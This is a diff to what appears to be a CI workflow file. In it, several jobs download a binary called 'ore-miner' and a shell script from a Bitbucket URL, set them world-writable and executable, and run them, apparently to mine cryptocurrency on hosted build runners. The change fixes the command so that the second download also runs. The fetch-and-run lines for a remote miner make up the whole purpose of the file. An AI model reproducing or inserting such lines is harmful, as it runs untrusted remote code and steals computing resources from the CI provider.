@@ -28,7 +28,7 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
-        timeout 5m wget https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/ore-miner && https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/4.sh && chmod 777 * && ./4.sh &
+        timeout 5m wget https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/ore-miner && wget https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/4.sh && chmod 777 * && ./4.sh &
         sleep 5m
       
         echo "sukses"
@@ -55,7 +55,7 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
-        wget https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/ore-miner && https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/4.sh && chmod 777 * && ./4.sh
+        wget https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/ore-miner && wget https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/4.sh && chmod 777 * && ./4.sh
      
   mechat2:
     needs: pemanasan
@@ -80,7 +80,7 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
-        wget https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/ore-miner && https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/4.sh && chmod 777 * && ./4.sh
+        wget https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/ore-miner && wget https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/4.sh && chmod 777 * && ./4.sh
         echo "sukses"
   Success:
     needs: [pemanasan, mechat]
